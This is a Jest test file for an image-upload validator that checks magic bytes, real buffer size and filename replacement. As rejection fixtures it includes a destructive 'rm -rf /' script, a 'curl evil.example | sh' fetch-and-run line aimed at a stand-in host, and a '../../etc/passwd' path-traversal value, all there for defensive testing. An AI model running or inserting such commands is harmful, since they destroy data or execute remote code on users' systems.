import { BusinessException, ErrorCode } from 'src/common/errors';
import { assertIsImage, detectImageType, safeFilename, type UploadedImage } from './image-upload';

/**
 * §5, §40 and §67.
 *
 * Everything here is about not trusting the caller. The filename, the
 * extension and the Content-Type are all chosen by whoever is uploading; only
 * the bytes are evidence.
 */

const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00]);
const WEBP = Buffer.concat([
  Buffer.from('RIFF', 'ascii'),
  Buffer.from([0x00, 0x00, 0x00, 0x00]),
  Buffer.from('WEBP', 'ascii'),
]);

function upload(overrides: Partial<UploadedImage> = {}): UploadedImage {
  return {
    originalname: 'list.jpg',
    mimetype: 'image/jpeg',
    size: JPEG.length,
    buffer: JPEG,
    ...overrides,
  };
}

function codeOf(run: () => unknown): ErrorCode | undefined {
  try {
    run();
    return undefined;
  } catch (error) {
    return error instanceof BusinessException ? error.code : undefined;
  }
}

describe('detectImageType', () => {
  it.each([
    ['JPEG', JPEG, 'image/jpeg'],
    ['PNG', PNG, 'image/png'],
    ['WEBP', WEBP, 'image/webp'],
  ])('recognises %s from its signature', (_label, buffer, expected) => {
    expect(detectImageType(buffer)).toBe(expected);
  });

  it.each([
    ['a shell script', Buffer.from('#!/bin/sh\nrm -rf /', 'ascii')],
    ['a zip archive', Buffer.from([0x50, 0x4b, 0x03, 0x04, 0x00])],
    ['an ELF binary', Buffer.from([0x7f, 0x45, 0x4c, 0x46])],
    ['an SVG', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg">', 'ascii')],
    ['an HTML page', Buffer.from('<!doctype html>', 'ascii')],
    ['empty bytes', Buffer.alloc(0)],
  ])('refuses %s', (_label, buffer) => {
    expect(detectImageType(buffer)).toBeNull();
  });

  it('refuses a RIFF container that is not WEBP', () => {
    // "RIFF" alone is also a WAV file. The format marker at offset 8 is what
    // distinguishes them, so a partial signature check would accept audio.
    const wav = Buffer.concat([
      Buffer.from('RIFF', 'ascii'),
      Buffer.from([0x00, 0x00, 0x00, 0x00]),
      Buffer.from('WAVE', 'ascii'),
    ]);

    expect(detectImageType(wav)).toBeNull();
  });

  it('refuses a file whose signature is truncated', () => {
    expect(detectImageType(PNG.subarray(0, 3))).toBeNull();
  });
});

describe('assertIsImage', () => {
  it('accepts a real image and reports its true type', () => {
    expect(assertIsImage(upload(), 8_000_000)).toEqual({
      buffer: JPEG,
      contentType: 'image/jpeg',
    });
  });

  it('trusts the bytes over the declared type', () => {
    // A PNG announced as a JPEG is fine — it is still an image, and what gets
    // forwarded downstream is the type this process verified, not the claim.
    expect(
      assertIsImage(upload({ buffer: PNG, mimetype: 'image/jpeg' }), 8_000_000).contentType,
    ).toBe('image/png');
  });

  it('refuses a script that claims to be a photo', () => {
    // The attack the magic-byte check exists for: right name, right extension,
    // right Content-Type, wrong bytes.
    const attack = upload({
      originalname: 'list.jpg',
      mimetype: 'image/jpeg',
      buffer: Buffer.from('#!/bin/sh\ncurl evil.example | sh', 'ascii'),
    });

    expect(codeOf(() => assertIsImage(attack, 8_000_000))).toBe(ErrorCode.IMAGE_INVALID);
  });

  it('refuses a missing file', () => {
    expect(codeOf(() => assertIsImage(undefined, 8_000_000))).toBe(ErrorCode.IMAGE_INVALID);
  });

  it('refuses an empty file', () => {
    expect(codeOf(() => assertIsImage(upload({ buffer: Buffer.alloc(0) }), 8_000_000))).toBe(
      ErrorCode.IMAGE_INVALID,
    );
  });

  it('refuses an oversized file', () => {
    expect(codeOf(() => assertIsImage(upload(), 4))).toBe(ErrorCode.IMAGE_TOO_LARGE);
  });

  it('measures the real buffer, not the reported size', () => {
    // A client-reported size is another claim. The buffer is the fact.
    const lying = upload({ size: 1, buffer: Buffer.concat([JPEG, Buffer.alloc(5_000)]) });

    expect(codeOf(() => assertIsImage(lying, 1_000))).toBe(ErrorCode.IMAGE_TOO_LARGE);
  });
});

describe('safeFilename', () => {
  it('discards the shopper filename entirely', () => {
    // Not sanitised — replaced. Sanitising is a game of finding every dangerous
    // form; replacing removes the question, and the name carries no
    // information anyone needs.
    expect(safeFilename('image/png')).toBe('grocery-list.png');
    expect(safeFilename('image/jpeg')).toBe('grocery-list.jpeg');
  });

  it('cannot produce a path', () => {
    const name = safeFilename('image/../../etc/passwd');

    expect(name).not.toContain('/');
    expect(name).not.toContain('..');
  });
});
